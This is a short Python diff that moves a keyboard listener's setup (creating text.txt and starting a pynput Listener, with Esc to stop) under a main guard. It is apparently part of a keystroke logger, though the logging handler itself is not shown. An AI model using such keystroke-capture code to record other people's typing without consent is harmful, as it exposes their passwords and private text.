@@ -30,13 +30,13 @@ def onPress(key):
 def onRelease(key):
     if key == Key.esc:
         return False
+if __name__ == '__main__':
+    try:
+        f = open('text.txt', 'r')
+    except:
+        f = open('text.txt', 'w')
+    f.close()
 
-try:
-    f = open('text.txt', 'r')
-except:
-    f = open('text.txt', 'w')
-f.close()
-
-with Listener(on_press = onPress, on_release = onRelease) as listener:
-    listener.join()
+    with Listener(on_press = onPress, on_release = onRelease) as listener:
+        listener.join()
 
